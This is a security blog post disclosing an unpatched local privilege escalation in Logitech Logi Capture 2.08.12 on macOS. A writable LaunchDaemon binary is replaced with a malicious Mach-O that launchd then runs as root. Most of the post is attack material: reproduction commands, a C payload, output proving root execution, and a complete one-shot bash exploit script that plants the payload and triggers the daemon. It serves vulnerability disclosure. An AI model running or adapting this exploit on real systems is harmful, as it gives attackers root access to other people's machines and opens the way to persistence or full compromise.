---
title:  "NO-CVE 0day: Logitech Logi Capture 2.08.12 macOS Local Privilege Escalation (LogiFacecamService)"
layout: post
categories: macOS
---

It was possible to achieve local privilege escalation (LPE) through the following high level abuse steps:
- Identification of weak POSIX directory and file permissions for an XPC Mach Service binary
- Replacement of the `/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService` binary a malicious Mach-O
- A reboot of the target macOS device



## Steps To Reproduce:

### Download and install Logi Capture

Logitech Capture can be downloaded directly from Logitech's website:
- [Logitech Capture](https://www.logitech.com/en-gb/software/capture.html)
- [Logitech Capture Direct Download](https://download01.logi.com/web/ftp/pub/techsupport/capture/Capture_2.08.12.zip)

The installation can be confirmed with the following command:
```
10:44:43-testmac@mpro:~/Desktop/LOGITECH$ lsappinfo | grep "Logi Capture" -A 6
46) "Logi Capture" ASN:0x0-0x69069: 
    bundleID="com.logitech.logicapture"
    bundle path="/Applications/Logi Capture.app"
    executable path="/Applications/Logi Capture.app/Contents/MacOS/Logi Capture"
    pid = 1378 type="Foreground" flavor=3 Version="2.08.12" fileType="APPL" creator="????" Arch=x86_64 
    parentASN="Spotlight" ASN:0x1-0x2ff: 
    launch time =  2023/12/28 10:24:10 ( 20 minutes, 36.2109 seconds ago )
    checkin time = 2023/12/28 10:24:10 ( 20 minutes, 36.016 seconds ago )
    launch to checkin time: 0.194869 seconds
```


### Confirm the use of the vulnerable directory in the LaunchDaemons plist

Confirmation that `Logi Capture` makes use of `/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService` for the Launch Daemon in the `com.Logitech.LogiFacecam.Service.plist` Launch Daemons configuration plist file.
```xml
10:41:06-testmac@mpro:~/Desktop/LOGITECH$ plutil -convert xml1 /Library/LaunchDaemons/com.Logitech.LogiFacecam.Service.plist -o /tmp/com.Logitech.LogiFacecam.Service.plist.xml
10:41:19-testmac@mpro:~/Desktop/LOGITECH$ cat /tmp/com.Logitech.LogiFacecam.Service.plist.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>KeepAlive</key>
	<true/>
	<key>Label</key>
	<string>com.Logitech.LogiFacecam.Service</string>
	<key>MachServices</key>
	<dict>
		<key>com.Logitech.LogiFacecam.Service</key>
		<true/>
	</dict>
	<key>ProgramArguments</key>
	<array>
		<string>/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService</string>
	</array>
</dict>
</plist>
```

### Confirm the presence of the `com.Logitech.LogiFacecam.Service` Launch Daemon
The `com.Logitech.LogiFacecam.Service` can be confirmed to be configured in `launchd` by using the following `launchctl` command:
```bash
10:06:53-testmac@mpro:~/Desktop/LOGITECH$ sudo launchctl list | grep -i logitech
283     0       com.Logitech.LogiFacecam.Service
```

### Confirm the weak directory permissions
The directory permissions can be confirmed with the following command:
```bash
10:08:57-testmac@mpro:~/Desktop/LOGITECH$ ls -@ -lah "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/"
total 600
drwxr-xr-x@ 3 testmac  staff    96B 24 Oct  2021 .
drwxr-xr-x@ 8 testmac  staff   256B 24 Oct  2021 ..
-rwxr-xr-x@ 1 testmac  staff   300K 24 Oct  2021 LogiFacecamService
```

### Prepare the malicious Mach-O

The following c code can be compiled as the malicious dylib. The result of the `date`, `whoami` and `id` commands are redirected into the `/tmp/com.Logitech.LogiFacecam.Service.pwn` file. The contents can be arbritrary, e.g. changing file permissions on protected files, installing persistence or providing a root terminal.
```c
/* gcc Logitech_LogiFacecam_LPE.c -o Logitech_LogiFacecam_LPE */
#include <stdlib.h>
int main() {
    system("date >> /tmp/com.Logitech.LogiFacecam.Service.pwn");
    system("whoami >> /tmp/com.Logitech.LogiFacecam.Service.pwn");
    system("id >> /tmp/com.Logitech.LogiFacecam.Service.pwn");
    return 0;
}
```

The original `LogiFacecamService` Mach-O was preserved:
```bash
11:04:10-testmac@mpro:~/Desktop/LOGITECH$ mv /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService.bak
```

The malicious `LogiFacecamService` Mach-O was copied to the vulnerable path:
```bash
11:04:10-testmac@mpro:~/Desktop/LOGITECH$ cp Logitech_LogiFacecam_LPE /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService
```

### Restart the MacOS machine
A reboot and a re-login will trigger `launchd` to load the malicious Mach-O and execute commands as `root`. 
> NOTE: Due to how launchd operates the `/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService` Mach-O will be executed as root every 10 seconds. To restore the state prior to execution `mv /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService.bak /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService`


### Verify the `root` code execution
The `/tmp/com.Logitech.LogiFacecam.Service.pwn` file contains the result of the `root` code execution:
```bash
10:18:03-testmac@mpro:~$ ls /tmp/
total 16
drwxrwxrwt  7 root     wheel   224B 28 Dec 10:17 .
drwxr-xr-x  6 root     wheel   192B 28 Dec 10:17 ..
-r--r--r--  1 testmac  wheel    11B 28 Dec 10:17 .X1002-lock
drwxrwxrwt  3 root     wheel    96B 28 Dec 10:17 .X11-unix
-rw-r--r--  1 root     wheel   1.3K 28 Dec 10:17 com.Logitech.LogiFacecam.Service.pwn
drwx------  3 testmac  wheel    96B 28 Dec 10:17 com.apple.launchd.vOiWsEqhb3
drwxr-xr-x  2 root     wheel    64B 28 Dec 10:17 powerlog
10:18:05-testmac@mpro:~$ cat /tmp/com.Logitech.LogiFacecam.Service.pwn 
Thu Dec 28 10:17:37 PST 2023
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Thu Dec 28 10:17:48 PST 2023
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Thu Dec 28 10:17:58 PST 2023
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Thu Dec 28 10:18:08 PST 2023
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
10:18:17-testmac@mpro:~$ uptime
10:18  up 50 secs, 2 users, load averages: 7.65 2.42 0.92
```


## One-shot exploit PoC 

```bash
########################################################################################################################
#!/bin/bash
########################################################################################################################
/bin/echo "[i] Title:  Logitech Logi Capture 2.08.12 macOS Local Privilege Escalation (LogiFacecamService)"
/bin/echo "[i] Author: emkay128"
/bin/echo "[i] File:   LogiFacecamService_pwn.sh"
########################################################################################################################
VULN_FILE=LogiFacecamService
DEMO_NAME=${VULN_FILE}_LPE
PATH="/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/"
PLIST=/Library/LaunchDaemons/com.Logitech.LogiFacecam.Service.plist
LPE_OUTFILE="/tmp/${VULN_FILE}.pwn"
########################################################################################################################
# STAGE 1 [EXPLOIT] #######################################################################################################
/bin/echo "[i] Checking if $PLIST exists"
if [ ! -f $PLIST ]; 
then
    /bin/echo "[FAIL] $PLIST doesn't exist :("
    exit   
fi

echo "[i] Viewing permissions for LogiFacecamService"
/bin/ls -@ -lah "$PATH"

test -w "${PATH}${VULN_FILE}" || {
   /bin/echo "[FAIL] Cannot write to the vuln file ${PATH}${VULN_FILE} :("
   exit
}

/bin/echo "[i] Creating backup of LogiFacecamService"
/bin/cp "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService" "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService.bak" 

/bin/echo "[i] Creating $DEMO_NAME.c file"
/bin/cat << EOF > /tmp/$DEMO_NAME.c
#include <stdlib.h>
int main() {
    system("/bin/date > $LPE_OUTFILE");
    system("/usr/bin/whoami >> $LPE_OUTFILE");
    system("/usr/bin/id >> $LPE_OUTFILE");
    return 0;
}
EOF

/bin/echo "[i] Compiling $DEMO_NAME.c file"
/usr/bin/gcc /tmp/$DEMO_NAME.c -o /tmp/$DEMO_NAME

/bin/echo "[i] chmodding $DEMO_NAME"
/bin/chmod +x /tmp/$DEMO_NAME

/bin/echo "[i] Copying malicious Mach-O to launchd path"
/bin/cp /tmp/$DEMO_NAME "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService"

/bin/echo "[i] Simulating a reboot (Needs password and saves you having to reboot your machine) (sudo launchctl kickstart -k system/com.Logitech.LogiFacecam.Service)"
/usr/bin/sudo /bin/launchctl kickstart -k system/com.Logitech.LogiFacecam.Service

/bin/echo "[i] Sleeping for 5 seconds"
/bin/sleep 5

/bin/echo "[i] Viewing the result of LPE"
/bin/cat $LPE_OUTFILE

/bin/echo "[i] Restoring the binary"
/bin/mv "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService.bak" "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService" 

/bin/echo "[i] Cleaning up"
/bin/rm -rf /tmp/${DEMO_NAME}*

/bin/echo "[i] Пока Пока !!!"
```



## Further Information
- [Logitech Capture](https://www.logitech.com/en-gb/software/capture.html)
- [Logitech Capture Direct Download](https://download01.logi.com/web/ftp/pub/techsupport/capture/Capture_2.08.12.zip)
- [Creating Launch Daemons and Agents -- Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)

## Impact

Elevation of privileges